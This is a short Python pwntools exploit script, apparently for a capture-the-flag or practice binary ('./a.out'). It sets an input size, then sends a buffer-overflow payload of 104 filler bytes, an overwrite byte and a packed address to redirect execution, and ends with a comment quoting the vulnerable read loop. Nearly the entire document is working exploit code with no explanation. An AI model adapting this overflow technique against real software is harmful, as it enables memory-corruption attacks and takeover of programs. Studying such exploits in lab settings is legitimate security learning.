from pwn import *
context.terminal = "bash"
p = process("./a.out")
for j in range(40):
    print(p.recvline())
print(p.recvuntil(b"size:"))
p.sendline(b'138') #read until n < size
print(p.recvuntil(b"bytes)!"))
win = b"~"*104 # biffer size
win += b'\x87' # N
#win += b"~"*8
win += pack(0xacb7)
p.sendline(win)
sys.stdout.flush()
p.sendline(win)
for j in range(350):
    print(j, " ", p.recvline())

'''
 while (n < size) {
      n += read(0, input + n, 1);  
'''